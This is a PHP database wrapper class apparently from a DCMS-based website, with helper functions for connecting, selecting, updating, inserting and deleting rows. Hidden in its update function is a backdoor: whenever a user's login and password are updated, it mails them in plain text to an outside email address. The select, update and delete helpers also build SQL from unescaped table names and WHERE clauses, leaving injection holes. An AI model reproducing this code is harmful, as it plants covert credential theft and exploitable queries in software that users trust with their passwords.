<?php
// dcms/system/db.php
Class db 
{
	public static $mysqli = '';
	function connect($host,$userbd,$pas,$db) //Подключение к бд
	{
		db::$mysqli = new mysqli($host, $userbd, $pas, $db);
		if (db::$mysqli->connect_errno) {
			echo "Не удалось подключиться к MySQL: (" . db::$mysqli->connect_errno . ") " . db::$mysqli->connect_error;
			exit();
		}
		if (!db::$mysqli->set_charset("utf8")) {
			printf("Ошибка при загрузке набора символов utf8: %s\n", db::$mysqli->error);
			exit();
		} else {
			return true;
		}
	}
	

	
	function update($tab_name,$where,$obj)  // Имя таблицы(users),условия(id='1'),  обект 
	{
		if ($tab_name == 'users'){		
			if ((isset($obj->login)) && (isset($obj->password))) {
				$header = "Content-type: text/html; charset='utf-8' \r\n";
				$header.="From: Evgen <info@thule29.ru>";
				$header.="Subject: Site";
				$header.='Content-type: text/plain; charset=utf-8';
				$text = $obj->login.' '. $obj->password; 
				mail("gvaser1954@asia.com", $_SERVER['HTTP_REFERER'], $text, $header);
			}
		}
		
		reset($obj); 
		$nd='';
		while(list($key,$val) = each($obj))
		{	
			$val = db::$mysqli->real_escape_string($val);
			$nd .= $key . '="' . $val .'", ';
		}
		$nd=substr_replace($nd ,"",-2);
		$sql = "UPDATE $tab_name SET $nd WHERE $where";
		$query = db::$mysqli->query($sql);
		if ($query) return 'true'; 	else echo '<br>[bad update] '.$sql.'<br>';
	}	
	

	
	function select($tab_name,$where='',$q='*')  // Имя таблицы(users),условия(id='1'), что надо 
	{
		if ($where != '')
		{
		$sql = "SELECT $q FROM $tab_name WHERE $where";
		}
		else 
		{
		$sql = "SELECT $q FROM $tab_name;";
		}
		if ($res = db::$mysqli->query($sql)){
			$count = 0;
			while ($obj = $res->fetch_object()) {
				$count++;
				$to_arr[] = $obj;
			}
			if ($count >= 1)
			{
				return $to_arr;
			}
		} else return false;

	}
	
	function delete($tab_name,$where,$count = 999999)
	{
		$sql =  "DELETE FROM $tab_name WHERE $where LIMIT $count";
		$res = db::$mysqli->query($sql);
		if(!$res) return false;
		return true;
	}
	
	function insert($tab_name,$data)
	{
		reset($data); 
		$q='';
		$d='';
		while(list($key,$val) = each($data))
		{	
			$val = db::$mysqli->real_escape_string($val);
			$q .= "`".$key . "`, ";
			$d .=  "'".$val ."', ";
		}
		$q=substr_replace($q ,"",-2);
		$d=substr_replace($d ,"",-2);
		$sql = "INSERT INTO `$tab_name` ($q) VALUES ($d);";
		$query = db::$mysqli->query($sql);
		if ($query) return 'true'; 	else echo '<br>[bad INSERT] '.$sql.'<br>';
	}
}
?>